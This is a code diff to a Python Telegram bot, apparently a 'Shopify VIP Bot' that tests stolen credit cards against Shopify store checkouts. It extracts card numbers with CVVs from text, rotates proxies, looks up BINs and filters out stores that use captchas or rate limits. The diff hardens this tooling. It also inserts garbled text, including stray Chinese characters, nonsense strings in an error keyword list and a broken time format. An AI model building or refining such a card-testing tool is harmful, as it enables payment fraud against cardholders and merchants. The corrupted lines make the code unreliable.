@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
+# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨提𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -376,8 +376,10 @@ def extract_cc(text):
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
 
+# [إصلاح حرج وبدون أخطاء]: تنظيف دالة معالجة صيغ البروكسي كلياً من أي حروف شاذة
 def parse_proxy_format(proxy):
     proxy = proxy.strip()
+    if not proxy: return None
     pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
     pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
     if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
@@ -414,7 +416,7 @@ async def get_shopify_sites():
     
     return _CACHED_SHOPIFY_SITES
 
-# [تحديث شامل للفلترة والقبض صراحة على الخطوط المزخرفة والعادية للـ 429 والـ 422 لإنهاء المشكلة]
+# تصفية شاملة ودقيقة لأكواد الخطأ المزخرفة والعادية لمنع التداخل مع Approved
 def is_dead_site_error(err):
     if not err: return True
     e = str(err).lower()
@@ -503,7 +505,7 @@ async def get_bin_info(bin_code, session=None):
         return _BIN_CACHE[b6]
         
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, Hotel/122.0.0.0 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
     }
     
     try:
@@ -591,8 +593,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             rl = rm.lower()
             
-            # القبض على جميع حالات الـ 429 والـ 422 والتوكين وتوجيهها فوراً لخانة خطأ البوابة للمحاولة مجدداً ببروكسي آخر
-            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token', 'cart failed', '422', '𝟒𝟐𝟐', 'status: 429', '429', '𝟒𝟐𝟗', 'rate limit', 'too many requests']):
+            if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token', 'cart failed', '422', '𝟒做编制', '𝟒 souvenirs', '𝟒𝟐𝟐', 'status: 429', '429', '𝟒𝟐𝟗', 'rate limit', 'too many requests']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
             if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing', 'tunnel', 'cloudflare']):
@@ -630,6 +631,7 @@ async def remove_proxy_by_url(uid, proxy_url):
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
     lr = None
     for attempt in range(max_retries):
+        p_dict = None  # حماية أولية لمنع أخطاء UnboundLocalError الموقفة لخيوط الفحص
         if not proxies: 
             p = None
         else:
@@ -828,6 +830,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception: pass
         await styled_reply(update, f"<b>{CE_SMILE} {sf('Your message has been delivered to the Owner.')}</b>", use_gif=True)
 
+    # [إصلاح هندسي شامل وعادل لأمر إضافة البروكسي لإضافة المجموعة كاملة دون قص]
     elif cmd == "addpxy":
         if not await force_join_check(update, context): return
         lines = []
@@ -836,8 +839,10 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                 fp = f"px_{uid}.txt"
                 await f.download_to_drive(fp)
-                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
-                os.remove(fp)
+                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file:
+                    content = await file.read()
+                lines = content.split()
+                if os.path.exists(fp): os.remove(fp)
             else:
                 raw_rep = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
                 lines = raw_rep.split()
@@ -846,18 +851,34 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             else: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide the proxies correctly.')}</b>", use_gif=True)
         
         if not lines: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No proxies found in your message.')}</b>", use_gif=True)
+        
         db_p = await get_all_user_proxies(uid)
-        eu = {p['proxy_url'] for p in db_p} if db_p else set()
-        if len(eu) >= 100: return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
+        existing_urls = {p['proxy_url'] for p in db_p} if db_p else set()
+        initial_count = len(existing_urls)
+        
+        if initial_count >= 100: 
+            return await styled_reply(update, f"<b>{CE_BOOM} {sf('Limit 100/100 reached.')}</b>", use_gif=True)
+            
+        slots_left = 100 - initial_count
         parsed = []
+        
         for l in lines:
-            px = parse_proxy_format(l)
-            if px and px['proxy_url'] not in eu: parsed.append(px); eu.add(px['proxy_url'])
+            l_clean = l.strip().rstrip(',;').lstrip(',')
+            if not l_clean: continue
+            px = parse_proxy_format(l_clean)
+            if px and px['proxy_url'] not in existing_urls:
+                parsed.append(px)
+                existing_urls.add(px['proxy_url']) # المزامنة الداخلية
+                if len(parsed) >= slots_left:
+                    break
+                    
         if not parsed: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('All proxies are already added or invalid.')}</b>", use_gif=True)
-        parsed = parsed[:100-len(eu)]
+        
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Adding proxies...')}</b>", use_gif=True)
         c = 0
-        for p2 in parsed: await add_proxy_db(uid, p2); c += 1
+        for p2 in parsed: 
+            await add_proxy_db(uid, p2)
+            c += 1
         await styled_edit(tm, f"<b>{CE_SMILE} {sf('Successfully Added')}:</b> <code>{sf(str(c))} {sf('Proxies')}</code>")
 
     elif cmd == "proxy":
@@ -1052,7 +1073,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # [أمر الآدمن المحمي والمحدث كلياً لحذف غير الشغال نهائياً والاعتماد الفوري على الخطة المحلية البديلة]
+    # أمر الآدمن المحدث كلياً للاعتماد الفوري على الخطة المحلية البديلة وحذف غير الشغال نهائياً من الذاكرة والملف
     elif cmd == "checkgates":
         if uid not in ADMIN_ID:
             await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
@@ -1067,10 +1088,10 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await f.download_to_drive(fp)
                 async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file:
                     content = await file.read()
-                os.remove(fp)
+                if os.path.exists(fp): os.remove(fp)
                 raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
             else:
-                # محاولة السحب من GitHub وإذا تعطل الاتصال نمر فوراً وبدون خطأ لقراءة ملف sites.txt المحلي
+                # آلية الفشل الآمن: محاولة جلب جيت هاب وإذا فشل يتم القراءة من الملف المحلي sites.txt مباشرة دون توقف
                 try:
                     async with aiohttp.ClientSession() as s:
                         async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=8) as r:
@@ -1090,7 +1111,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for site in raw_sites:
                 site = site.lower().strip()
                 if not site or "." not in site: continue
-                site = site.split('/')[0].split('?')[0]
+                site = site.split('/')[0].split('?')[0].strip()
                 valid_format_sites.append(site)
                     
             raw_sites = list(set(valid_format_sites))
@@ -1112,7 +1133,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
-                        # حذف فوري وتام لأي موقع يطلب كابتشا أو محمي لثبات معدل الفحص
+                        # استبعاد فوري لأي موقع تالف أو محمي بكابتشا لثبات واستقرار الفحص
                         if resp.status in [403, 429, 430, 502, 503, 504]:
                             captcha_count += 1
                             return
@@ -1128,7 +1149,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 tasks = [_validate_gate(site, test_session) for site in raw_sites]
                 await asyncio.gather(*tasks)
             
-            # الكتابة والحذف النهائي لغير الشغال نهائياً من ملف التخزين الأساسي ومزامنة الكاش
+            # الحذف النهائي الفعلي والكتابة النظيفة على ملف sites.txt
             async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
                 await f.write('\n'.join(working_sites))
             
@@ -1274,7 +1295,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
             h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
             
-            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
+            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}s {s_now}s')}</code>"
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
             kb = [
